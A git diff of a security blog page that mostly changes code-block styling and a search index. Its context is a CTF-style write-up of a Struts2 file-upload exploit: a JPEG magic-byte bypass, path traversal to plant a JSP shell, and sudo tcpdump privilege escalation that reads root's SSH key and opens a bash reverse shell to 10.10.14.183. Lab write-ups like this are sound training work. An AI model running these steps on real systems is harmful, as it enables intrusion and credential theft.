 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hexdump /home/kali/Downloads/<span style="color:#f92672">[</span>jpgName<span style="color:#f92672">]</span>.jpg | head -n <span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hexdump /home/kali/Downloads/<span style="color:#f92672">[</span>jpgName<span style="color:#f92672">]</span>.jpg | head -n <span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-05-30-203201_.png">
     </figure>
 
 <p>Now this is using big-endian notation so that means the order is reversed of the bytes in the columns so the correct order is.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cfg" data-lang="cfg"><span style="display:flex;"><span><span style="color:#a6e22e">ff d8 ff</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cfg" data-lang="cfg"><span style="display:flex;"><span><span style="color:#a6e22e">ff d8 ff</span>
 </span></span></code></pre></div></li>
 </ul>
 <ul>
@@ -871,7 +871,7 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <li>Read Existing Source Code:</li>
 </ol>
 <p>The second and easier option in this case is to read the code that checks the magic bytes as the values are actually hard-coded.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (header<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> (<span style="color:#66d9ef">byte</span>)0xFF <span style="color:#f92672">&amp;&amp;</span> header<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> (<span style="color:#66d9ef">byte</span>)0xD8 <span style="color:#f92672">&amp;&amp;</span> header<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> (<span style="color:#66d9ef">byte</span>)0xFF) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (header<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> (<span style="color:#66d9ef">byte</span>)0xFF <span style="color:#f92672">&amp;&amp;</span> header<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> (<span style="color:#66d9ef">byte</span>)0xD8 <span style="color:#f92672">&amp;&amp;</span> header<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> (<span style="color:#66d9ef">byte</span>)0xFF) {
 </span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
 </span></span><span style="display:flex;"><span>            }
 </span></span></code></pre></div><p>Again we can see it&rsquo;s <code>FF D8 FF</code> but in this case it&rsquo;s displayed in hex format which we actually need for this. <code>0xFF 0xD8 0xFF</code></p>
@@ -894,12 +894,12 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <p>Now we have the magic bytes we can use hexeditor to pre-pend them to our shell.</p>
 <p>First we will open the shell in our text editor and add an additional empty line at the start, &amp; just type 123, this is to allow space for our magic bytes to be prepended.</p>
 <p>So the start of the file will now look like this.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>123
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>123
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;%</span><span style="color:#a6e22e">@page</span> import<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;java.lang.*&#34;</span><span style="color:#f92672">%&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;%</span><span style="color:#a6e22e">@page</span> import<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;java.util.*&#34;</span><span style="color:#f92672">%&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>restOfFile<span style="color:#f92672">]</span>
 </span></span></code></pre></div><p>Now we use hexeditor add the necessary HEX bytes at the start</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hexeditor shell.jsp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hexeditor shell.jsp
 </span></span></code></pre></div><p>We can now just overwrite the first 3 bytes by manually typing in <code>FF D8 FF</code></p>
 <p><strong>Before</strong>:
 <p class="imgp">
@@ -913,14 +913,14 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 </p>
 <p>We then hit <code>CTRL+X</code> to save.</p>
 <p>Finally we rename the payload.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp shell.jsp shell.jpg
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp shell.jsp shell.jpg
 </span></span></code></pre></div><p>+Note+: I would advise copying as opposed to just moving/renaming as we may need to adjust.</p>
 <h4 id="crafting-our-malicious-request">Crafting our Malicious Request:</h4>
 <h5 id="adding-an-additional-form-data-field">Adding An Additional Form-data field:</h5>
 <p>Now we have our payload we need to upload it and modify the request to include the <code>OGNL</code> modification to rename our <code>shell.jpg</code> to <code>shell.jsp</code></p>
 <p>To do this we are going to add another form-data field, directly below the body of our upload <code>shell.jpg</code> data.</p>
 <p>To do this we intercept the upload in burpsuite and add the following.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>------WebKitFormBoundaryolcNpSpn9Sn2GWqN
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>------WebKitFormBoundaryolcNpSpn9Sn2GWqN
 </span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;top.UploadFilename&#34;</span>
 </span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-06-01-093941_.png" alt=""  />
@@ -930,14 +930,14 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <h5 id="determining-upload-location">Determining Upload Location:</h5>
 <p>We now need to determine where we are going to upload the file to, as the struts vulnerability allows for file traversal we need to place it in a directory where we know it will be processed as <code>java/jsp</code> code and not just statically served.</p>
 <p>To determine this location we can look at the <code>web.xml</code> file located in <code>/src/main/webapp/WEB-INF</code> this is a configuration file used by the application.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>staticServlet<span style="color:#f92672">&lt;/servlet-name&gt;</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url-pattern&gt;</span>/uploads/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
 </span></span></code></pre></div><p>We can see that any (<code>*</code>) file placed in the <code>/uploads/</code> folder path will use the <code>staticServlet</code> to serve the content. This servlet is used for static content only, images, text files, plain HTML etc. Meaning anything placed in here will not be processed using <code>JSP</code>. However we want to have our reverse shell processed and executed as code, so we will need to escape this folder.</p>
 <p>We also know that all uploads are placed in their own time-stamped folder within <code>/uploads/</code> we need to escape the time-stamped folder and the uploads folder so we will use <code>../../</code> to move up two directories.</p>
 <p>This means our request now looks like the below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>------WebKitFormBoundary olcNpSpn9Sn2GWqN
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>------WebKitFormBoundary olcNpSpn9Sn2GWqN
 </span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;top.UploadFileName&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>../../rev-shell.jsp
@@ -949,7 +949,7 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <p>Side Quest: Setter Methods:</p>
 <p>In Java, a setter method is a function that lets other parts of the program assign a value to a private variable. In this case, Struts2 uses these setter methods to automatically take values from HTTP requests and pass them into the code. For example, <code>setUploadFileName()</code> lets the app receive a filename from the form and store it in a variable in a variable called <code>UploadFileName</code>.</p>
 <p>If we look at the java code from <code>Upload.java</code> we can see some setter methods below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setUpload</span>(File upload) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setUpload</span>(File upload) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">upload</span> <span style="color:#f92672">=</span> upload;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
@@ -969,7 +969,7 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <p><strong>OGNL Case Sensitivity</strong>:</p>
 <p>OGNL is case-sensitive when resolving property names and method calls (unless explicitly configured otherwise). Because it binds incoming HTTP parameters to Java object properties using their names, <strong>the case must match exactly</strong>.</p>
 <p>In the form data we initially see the below is used.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;upload&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;upload&#34;</span>
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-06-01-095344_.png">
     </figure>
 
@@ -980,7 +980,7 @@ In this section of the <code>Upload.java</code> file, the application handles wh
     </figure>
 
 <p>So knowing this we know we need to modify the form data to read <code>name=&quot;Upload&quot;</code> …with a capital <code>U</code> like below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>------WebKitFormBoundarySETxW9w3w1WbVLqt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>------WebKitFormBoundarySETxW9w3w1WbVLqt
 </span></span><span style="display:flex;"><span>Content-Disposition: form-data; name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Upload&#34;</span>; filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;shell.jsp&#34;</span>
 </span></span><span style="display:flex;"><span>Content-Type: application/octet-stream
 </span></span></code></pre></div></li>
@@ -1007,7 +1007,7 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <p>Now we have access let&rsquo;s get enumerating for privilege Escalation paths.</p>
 <h4 id="stabilizing-our-shell-using-script-upgrading-our-shell">Stabilizing Our Shell Using <code>script</code>: Upgrading Our Shell</h4>
 <p>You can see the shell is very limited. After checking for python &amp; socat we find they are not present. However we can use <code>script</code> to stabilize our shell.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>script /dev/null -c /bin/bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>script /dev/null -c /bin/bash
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-06-01-145646_.png">
 </figure>
 
@@ -1015,7 +1015,7 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <p>Checking the <code>/etc/passwd</code> file we can see the user James exists and the description field has the string &ldquo;Network Administrator&rdquo; and as there are not other users apart from root to go after I think he will be our next logically target.</p>
 <p>Checking his home directory we cannot access it as expected.</p>
 <p>Checking lastlog we can see that the only two users to ever login have been root &amp; james</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lastlog | grep -v <span style="color:#e6db74">&#34;**Never logged in**&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lastlog | grep -v <span style="color:#e6db74">&#34;**Never logged in**&#34;</span>
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-06-01-151355_.png">
 </figure>
 
@@ -1049,24 +1049,24 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <ol>
 <li>
 <p>First we sets a variable called <code>COMMAND</code> with the command that we want to run, read the root ssh key and save it to a location we control</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>COMMAND<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;cat /root/.ssh/id_rsa &gt;&gt; /home/james/key.txt&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>COMMAND<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;cat /root/.ssh/id_rsa &gt;&gt; /home/james/key.txt&#39;</span>
 </span></span></code></pre></div></li>
 <li>
 <p>We create a temporary file using <code>mktemp</code>, and assigns the path to a variable <code>TF</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>
 </span></span></code></pre></div><p>Example output: <code>/tmp/tmp.abc123</code></p>
 </li>
 <li>
 <p>We now copy the content of the <code>COMMAND</code> variable into the temporary file <code>TF</code>. This writes the content of <code>COMMAND</code> into the file stored in <code>TF</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span>$COMMAND<span style="color:#e6db74">&#34;</span> &gt; $TF
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span>$COMMAND<span style="color:#e6db74">&#34;</span> &gt; $TF
 </span></span></code></pre></div></li>
 <li>
 <p>We make the temp file executable so it can be run as a script and executed.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>chmod +x $TF
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>chmod +x $TF
 </span></span></code></pre></div></li>
 <li>
 <p>This is where the abuse of <code>tcpdump</code> happens (the magic).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo tcpdump -ln -i lo -w /dev/null -W <span style="color:#ae81ff">1</span> -G <span style="color:#ae81ff">1</span> -z $TF -Z root
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo tcpdump -ln -i lo -w /dev/null -W <span style="color:#ae81ff">1</span> -G <span style="color:#ae81ff">1</span> -z $TF -Z root
 </span></span></code></pre></div><ul>
 <li><code>sudo tcpdump</code> initiates the process as root.</li>
 <li><code>-ln</code> – disables name resolution for IPs and ports.</li>
@@ -1101,7 +1101,7 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <p>Well well well after all that the root account still required a password when sshing in, so if you try and access with that key it will not work, instead lets give ourselves a reverse root shell using the same technique.</p>
 <h4 id="attempt-2-getting-a-root-reverse-shell">Attempt 2: Getting A Root Reverse Shell:</h4>
 <p>We use the same set of commands again, this time just modifying the malicious command.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>COMMAND<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.183/9090 0&gt;&amp;1&#39;&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>COMMAND<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.183/9090 0&gt;&amp;1&#39;&#34;</span>
 </span></span><span style="display:flex;"><span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span>$COMMAND<span style="color:#e6db74">&#34;</span> &gt; $TF
 </span></span><span style="display:flex;"><span>chmod +x $TF
@@ -1122,7 +1122,7 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <p>So typically what we could do is make a new user, however I am going to generate another key for the root user.</p>
 <ol>
 <li>Generate SSH Key for the User:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ssh-keygen -t rsa -b <span style="color:#ae81ff">4096</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ssh-keygen -t rsa -b <span style="color:#ae81ff">4096</span>
 </span></span></code></pre></div></li>
 </ol>
 <figure><img src="/ox-hugo/2025-06-01-172112_.png">
@@ -1131,22 +1131,22 @@ In this section of the <code>Upload.java</code> file, the application handles wh
 <ol>
 <li>
 <p>Copy Public Key to Authorized Keys:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ~/.ssh/id_rsa2.pub ~/.ssh/authorized_keys
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ~/.ssh/id_rsa2.pub ~/.ssh/authorized_keys
 </span></span></code></pre></div><ul>
 <li>This command copies the public key to the authorized_keys file, which is used by SSH to authenticate the user.</li>
 </ul>
 </li>
 <li>
 <p>Copy Private key to attack machine and put in it&rsquo;s own file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat id_rsa2
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat id_rsa2
 </span></span></code></pre></div></li>
 <li>
 <p>Change the mode of the key so the permissions are not too open:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo chmod <span style="color:#ae81ff">400</span> id_rsa
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo chmod <span style="color:#ae81ff">400</span> id_rsa
 </span></span></code></pre></div></li>
 <li>
 <p>Verify it works:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ssh -i id_rsa2 root@$box
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ssh -i id_rsa2 root@$box
 </span></span></code></pre></div></li>
 </ol>
 <figure><img src="/ox-hugo/2025-06-01-172410_.png">
@@ -1340,6 +1340,13 @@ document.addEventListener("DOMContentLoaded", function() {
 <script>
 window.store = {
     
+    "\/\/uildDrafts:1313\/tags\/ansible\/": {
+        "title": "Ansible",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
+    },
+    
     "\/\/uildDrafts:1313\/author\/": {
         "title": "Author",
         "tags": [],
@@ -1347,11 +1354,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/author\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/blind\/": {
-        "title": "Blind",
+    "\/\/uildDrafts:1313\/tags\/automation\/": {
+        "title": "Automation",
         "tags": [],
         "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
+        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
     },
     
     "\/\/uildDrafts:1313\/author\/bloodstiller\/": {
@@ -1366,6 +1373,55 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
+        "title": "Dotfiles",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/kali\/": {
+        "title": "Kali",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/qemu\/": {
+        "title": "Qemu",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/": {
+        "title": "Security Newsroom Obsidian Plugin Release",
+        "tags": ["kali","automation","qemu","ansible","dotfiles",],
+        "content": "Security Newsroom Obsidian Plugin Release I\u0026rsquo;ve been quiet for a while. Work has been busy \u0026amp; I have been doing some other projects that I can\u0026rsquo;t get into\u0026hellip;\u0026hellip;\nI\u0026rsquo;ve made the switch from my beloved eMacs to obsidian over the last few months and apart from the first week it\u0026rsquo;s been relatively painless. I\u0026rsquo;ve managed to recreate 99% of all eMacs functionality in obsidian (that\u0026rsquo;s functionality I used, not all of eMacs functionality as that would not be possible.)\nOne thing that I have found myself needing is an easy way to keep up with security related news. As the landscape is constantly evolving and growing and there a million different sources to get information from I got bored of jumping around so I thought \u0026ldquo;what if it was just in obsidian\u0026rdquo;. I use obsidian as my web-clipper anyone so let\u0026rsquo;s just put the functionality in here (I say here as I am writing the post in Obsidian)\nSo I decided to create the security newsroom plugin. https://github.com/bloodstiller/obsidian-security-newsroom I\u0026rsquo;ve created a pull request for it to be placed into the official community plugins but so far it has not.\nIt essentially pulls from lots of security resources and allows you to filter, save \u0026amp; clip the whole articles directly within obsidian.\nFull video showing how it works. At the moment as it\u0026rsquo;s not currently approved in the obsidian store if you want to use it you will have to manually add a folder called in your .obsidian/plugins folder called security-newsroom and place the main.js, manifest.json \u0026amp; styles.css from the repo and then load the plugin.\n", 
+        "url": "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/": {
+        "title": "Tags",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/": {
+        "title": "Tools",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tools\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/blind\/": {
+        "title": "Blind",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/ctf-writeup\/": {
@@ -1445,13 +1501,6 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/portswigger\/sqli_lab_15\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/": {
-        "title": "Tags",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/"
-    },
-    
     "\/\/uildDrafts:1313\/tags\/waf\/": {
         "title": "Waf",
         "tags": [],
@@ -1460,7 +1509,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/web-exploitation\/": {
-        "title": "Web-Exploitation",
+        "title": "Web Exploitation",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/web-exploitation\/"
@@ -1873,7 +1922,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/llm\/": {
-        "title": "Llm",
+        "title": "LLM",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/llm\/"
@@ -2328,7 +2377,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/msi\/": {
-        "title": "MSI",
+        "title": "Msi",
         "tags": [],
         "content": "", 
